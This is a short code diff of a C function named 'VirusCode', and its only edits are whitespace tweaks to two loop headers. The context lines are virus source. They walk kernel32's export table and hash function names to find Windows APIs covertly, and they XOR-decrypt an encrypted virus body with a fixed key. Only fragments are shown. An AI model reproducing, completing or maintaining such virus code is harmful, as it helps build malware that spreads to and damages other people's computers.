@@ -225,7 +225,7 @@ int WINAPI VirusCode()
  
     // Loop over the function names
  
-    for(i = 0;i < p_image_export_directory->NumberOfNames;i++)
+    for(i = 0;i < p_image_export_directory->NumberOfNames; i++)
     {
         PUCHAR ptr = (PUCHAR)Kernel32Base + Name[i]; // Pointer to function name
         ULONG Hash = 0;
@@ -297,7 +297,7 @@ int WINAPI VirusCode()
  
         // Decrypt the virus
  
-        for(i = 0;i<FileSize;i++)
+        for(i = 0;i < FileSize;i++)
         {
             DecryptedVirus[i] = EncryptedVirus[i]^VIRUS_KEY;
         }
